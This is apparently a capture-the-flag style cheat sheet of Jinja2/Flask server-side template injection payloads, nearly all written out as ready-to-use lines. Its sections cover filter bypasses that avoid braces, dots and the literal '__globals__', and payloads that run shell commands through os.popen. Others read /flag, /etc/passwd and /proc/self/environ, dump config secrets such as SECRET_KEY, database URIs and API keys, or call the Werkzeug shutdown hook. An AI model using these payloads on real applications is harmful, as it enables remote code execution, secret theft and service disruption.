# Extended bypass — deep per-engine evasions

`ssti-bypass.md` is the general construction toolkit. This file is
the engine-specific arsenal — where the general bypasses land on
each engine's real filter shapes.

---

## Jinja2 deep-bypass — the full arsenal

### The `{% %}`-only escape — `{{}}` fully stripped

```jinja2
{%set x='__cl'+'ass__'%}
{%set y='__gl'+'obals__'%}
{%set o='os'%}
{%set p='pop'+'en'%}
{%set c='id'%}
{%set f=lipsum[y][o][p]%}{{f(c).read()}}
   — but if {{}} is stripped the {{f(c).read()}} won't render —
   → write to webroot instead:
{%set r=lipsum[y][o][p]%}{%set x=r('cat /flag > /app/static/f').read()%}
   — wait, popen returns result via read() — which needs {{}}? no —
   we just need the SIDE EFFECT — write-to-file doesn't need output:
{%set f=lipsum[y]['os']['popen']%}{%set _=f('cat /flag > /app/static/f')%}
   — set-consumes — the call happened — GET /app/static/f
```

`{%set x = PAYLOAD %}` — evaluates the RHS — the side-effect
file-write needs no `{{}}` at all.

### The `attr`-chain — when `.` dies

```jinja2
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
{{lipsum|attr('__globals__')}}
{{(lipsum|attr('__globals__'))['os']['popen']('id')['read']()}}
{{lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('id')|attr('read')()}}
   — dict.get — alternate accessor — get('os') → same as ['os']
{{lipsum|attr('__globals__')|attr('__getitem__')('os')}}
```

`|attr('__getitem__')('key')` — calling `__getitem__` via attr —
the bracket-free dict-reach.

### The `__getitem__` method-call — bracket-alternative

```jinja2
{{lipsum.__globals__.__getitem__('os')}}
{{lipsum.__globals__.__getitem__('os').popen('id').read()}}
{{lipsum.__globals__.get('os').popen('id').read()}}
{{lipsum['__globals__'].get('os').popen('id').read()}}
{{lipsum.__globals__.items()}}
{{lipsum.__globals__.keys()}}
{{lipsum.__globals__.values()}}
```

`.get('x')`/`.__getitem__('x')` — method-forms of `['x']`.

### The `{%print%}`/echo statements — output without `{{}}`

```jinja2
{%print(7*7)%}
{%print(config)%}
{%print(_context)%}
{%print(lipsum.__globals__)%}
{%print(lipsum.__globals__.os.popen('id').read())%}
{%print(self.__init__.__globals__)%}
{%print(request)%}
{%print(session)%}
{%print(lipsum.__globals__.os.environ)%}
```

`{%print(expr)%}` — the statement-echo — output without `{{}}`.

### The `__init__`-sidechain — no `__globals__` needed?

```jinja2
{{self.__init__}}                   — bound method → its __globals__
{{self.__init__.__globals__}}       — there it is anyway —
                                      __init__ IS a function —
                                      the chain still ends at
                                      __globals__ — but some filters
                                      block '__globals__' literally —
                                      the obj paths reach it anyway
{{self.__init__.__globals__ if self else ''}}
{{self|attr('__init__')|attr('__globals__')}}
{{self.__init__|attr('__globals__')}}
```

### The `func`/`im_func` variants — old-Python names

```jinja2
{{f.func_globals}}                  — python2 name for __globals__
{{f.__globals__}}                    — python3
{{f.globals}}                        — unbound-fn attr? no
{{x.__init__.func_globals}}          — py2-style on bound-method
```

Python2 leftovers — `func_globals` — rarely relevant but old
apps/frameworks carry it.

### The `__builtins__` dict-vs-module split

```jinja2
{{x.__globals__['__builtins__']}}                 — module or dict!
{{x.__globals__['__builtins__']['open']('/flag')}}  — dict-form
{{x.__globals__['__builtins__'].open('/flag')}}     — module-form
{{x.__globals__['__builtins__'].eval('code')}}
{{x.__globals__['__builtins__']['eval']('code')}}
{{x.__globals__['__builtins__']['__import__']('os')}}
```

`__builtins__` is a dict in `__main__`-context, a module in
imported-module-context — try BOTH `['x']` and `.x`.

### The `self`/context reach — deeper

```jinja2
{{self._TemplateReference__context}}
{{self._TemplateReference__context.vars}}
{{self._TemplateReference__context.parent}}
{{self._TemplateReference__context.environment}}
{{self._TemplateReference__context.name}}
{{self._TemplateReference__context.blocks}}
{{self._TemplateReference__context.eval_ctx}}
{{self._TemplateReference__context.exported_vars}}
{{self._TemplateReference__context.callable}}
{{self._TemplateReference__context.cycles}}
{{self._TemplateReference__context['flag']}}
{{self._TemplateReference__context.vars['flag']}}
{{self._TemplateReference__context.parent.flag}}
{{self._TemplateReference__context.vars.keys()}}
{{self._TemplateReference__context.parent.keys()}}
```

The `parent` context — outer-scope — may bind flag-vars the
local-context doesn't.

### The `url_for`/`get_flashed_messages`/`get_template_attribute` chain

```jinja2
{{url_for.__globals__}}
{{url_for.__globals__.current_app}}
{{url_for.__globals__.current_app.config}}
{{url_for.__globals__.current_app.config['SECRET_KEY']}}
{{url_for.__globals__.current_app.config['FLAG']}}
{{url_for.__globals__.current_app.jinja_env}}
{{url_for.__globals__.current_app.jinja_env.globals}}
{{url_for.__globals__.current_app.config.items()}}
{{url_for.__globals__.request}}
{{url_for.__globals__.request.application}}
{{get_flashed_messages.__globals__}}
{{get_flashed_messages.__globals__.current_app}}
{{get_flashed_messages.__globals__.current_app.config}}
{{get_template_attribute.__globals__}}
{{get_template_attribute.__globals__.current_app}}
{{get_template_attribute.__globals__.current_app.config}}
{{get_template_attribute('x','flag')}}                — template-attr-read?
```

`url_for`'s module is flask.helpers — its `__globals__` holds
`current_app` → the LIVE app → its `.config` → flag-secrets.

### The `request` deep-reach

```jinja2
{{request.application}}
{{request.application.__globals__}}
{{request.application.__globals__['os']}}
{{request.application.__globals__['os'].environ}}
{{request.application.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.FLAG}}
{{request.application.__call__.__globals__}}
{{request.application.__call__.__globals__.os}}
{{request.application.__call__.__globals__.os.environ}}
{{request.environ}}
{{request.environ['werkzeug.server.shutdown']}}
{{request.environ.get('flag')}}
{{request.environ.get('werkzeug.request')}}
{{request.environ.get('werkzeug.server.shutdown')()}}
{{request.args}}
{{request.args.get('x')}}
{{request.args.x}}
{{request.values.x}}
{{request.form.x}}
{{request.cookies.x}}
{{request.cookies.get('x')}}
{{request.headers.get('x')}}
{{request.headers['x']}}
{{request.headers['User-Agent']}}
{{request.get_json()}}
{{request.json}}
{{request.data}}
{{request.get_data()}}
{{request.full_path}}
{{request.url}}
{{request.method}}
{{request.host}}
{{request.remote_addr}}
{{request.user_agent}}
{{request.blueprint}}
{{request.endpoint}}
{{request.view_args}}
{{request.path}}
{{request.base_url}}
{{request.url_root}}
{{request.url_rule}}
{{request.url_rule.rule}}                        — the route-pattern
{{request.environ['werkzeug.request']}}
{{request.environ['werkzeug.request'].application}}
{{request.environ['werkzeug.request'].application.__globals__}}
```

### The `config` deep-reach

```jinja2
{{config}}
{{config.items()}}
{{config.keys()}}
{{config.values()}}
{{config.get('FLAG')}}
{{config.get('SECRET_KEY')}}
{{config.get('SQLALCHEMY_DATABASE_URI')}}
{{config.get('DATABASE_URL')}}
{{config.get('MAIL_PASSWORD')}}
{{config.get('API_KEY')}}
{{config['FLAG']}}
{{config.FLAG}}
{{config.from_pyfile('/flag')}}
{{config.from_pyfile('/app/config.py')}}
{{config.from_pyfile('/proc/self/environ')}}
{{config.from_pyfile('/etc/passwd')}}
{{config.from_pyfile('/app/app.py')}}
{{config.from_pyfile('../flag')}}
{{config.from_pyfile('../../flag')}}
{{config.from_pyfile('/flag') or config.FLAG}}
{{config.from_pyfile('/flag') or config.items()}}
{{config.from_object('os')}}
{{config.from_envvar('FLAG')}}
{{config.get_namespace('FLAG_')}}
{{config.get_namespace('DB_')}}
{{config.get_namespace('SECRET_')}}
{{config.get_namespace('AWS_')}}
```

`from_pyfile` EXECUTES the file as python-config — non-python
errors, but real .py configs load — the `get_namespace` prefix-
filter pulls all matching keys.

### The `session`/`g`/`url_for` leaks

```jinja2
{{session}}
{{session.items()}}
{{session.get('flag')}}
{{session['flag']}}
{{session.get('admin')}}
{{session.get('user')}}
{{g}}
{{g.flag}} {{g.get('flag')}} {{g.user}}
{{url_for}}
{{url_for('static', filename='x')}}
{{url_for.__globals__}}
```

### The subclass-by-name bank — selectattr

```jinja2
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','Popen')|first}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','_wrap_close')|first}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','FileLoader')|first}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','zipimporter')|first}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','BuiltinImporter')|first}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__module__','equalto','subprocess')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__module__','equalto','os')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__module__','equalto','builtins')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__module__','equalto','warnings')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__module__','equalto','jinja2')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','search','Popen')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','search','file')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','search','import')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','search','load')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','search','zip')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','search','File')|list}}
```

`|selectattr('__name__','equalto','Popen')|first` — the name-
filtered subclass — no index guesswork.

### The index-permutations — mro/base path variants

```jinja2
{{''.__class__.__mro__[1]}}                        — object
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__base__}}                          — object — same
{{''.__class__.__base__.__subclasses__()}}
{{''.__class__.__bases__}}                         — tuple
{{''.__class__.__bases__[0]}}                      — object
{{''.__class__.__bases__[0].__subclasses__()}}
{{[].__class__.__mro__[1].__subclasses__()}}
{{{}.__class__.__mro__[1].__subclasses__()}}
{{(1).__class__.__mro__[1].__subclasses__()}}
{{(1.0).__class__.__mro__[1].__subclasses__()}}
{{True.__class__.__mro__[1].__subclasses__()}}
{{None.__class__.__mro__[1].__subclasses__()}}
{{x.__class__.__mro__[1].__subclasses__()}}        — any obj
{{lipsum.__class__.__mro__[1].__subclasses__()}}   — bound-obj path
{{lipsum.__class__.__base__.__subclasses__()}}
{{self.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__mro__[1].__subclasses__()}}
{{request.__class__.__mro__[1].__subclasses__()}}
{{session.__class__.__mro__[1].__subclasses__()}}
{{g.__class__.__mro__[1].__subclasses__()}}
{{url_for.__class__.__mro__[1].__subclasses__()}}   — wait — url_for
                                                      is a FUNCTION —
                                                      functions' class
                                                      is 'function' —
                                                      its mro[1] is
                                                      object — same list
{{7*7}} vs {{'7'*7}} — the str-mul tell — any type works as anchor
```

Every object's `.class.mro[1]` reaches `object` — the subclasses
list is GLOBAL — the anchor type doesn't matter.
